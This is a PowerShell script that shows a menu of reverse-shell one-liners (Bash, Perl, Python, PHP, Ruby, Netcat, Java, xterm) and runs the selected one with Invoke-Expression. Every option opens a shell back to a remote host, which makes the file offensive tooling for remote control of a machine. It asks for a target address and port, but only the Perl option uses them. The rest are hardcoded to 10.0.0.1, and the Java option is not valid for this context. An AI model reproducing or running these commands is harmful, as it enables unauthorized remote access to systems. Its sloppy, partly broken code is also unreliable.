# Function to display a menu and get user choice

$address = Read-Host "Enter the IP address of target machine:"
$port = Read-Host "Enter the port of target machine:"

Function Show-Menu {
    Clear-Host
    Write-Host "Select a reverse shell option:"
    Write-Host "1. Bash"
    Write-Host "2. PERL"
    Write-Host "3. Python"
    Write-Host "4. PHP"
    Write-Host "5. Ruby"
    Write-Host "6. Netcat"
    Write-Host "7. Java"
    Write-Host "8. xterm"
    Write-Host "9. Exit"
}

# Display the menu
Do {
    Show-Menu
    $choice = Read-Host "Enter your choice (1-9)"

    Switch ($choice) {
        '1' {Invoke-Expression "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}
        '2' {Invoke-Expression "perl -e 'use Socket;\$i=\"$address\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))){open(STDIN,\">"&"S\");open(STDOUT,\">"&"S\");open(STDERR,\">"&"S\");exec(\"/bin/sh -i\");};'"}
        '3' {Invoke-Expression "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'"}
        '4' {Invoke-Expression "php -r '\$sock=fsockopen(""10.0.0.1"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"}
        '5' {Invoke-Expression "ruby -rsocket -e'f=TCPSocket.open(""10.0.0.1"",1234).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'"}
        '6' {Invoke-Expression "nc -e /bin/sh 10.0.0.1 1234"}
        '7' {Invoke-Expression "r = Runtime.getRuntime();p = r.exec([""/bin/bash"",""-c"",""exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[]);p.waitFor()"}
        '8' {Invoke-Expression "xterm -display 10.0.0.1:1"}
        '9' {Exit}
        Default {Write-Host "Invalid choice. Please select a valid option (1-9)"}
    }
} Until ($choice -eq '9')
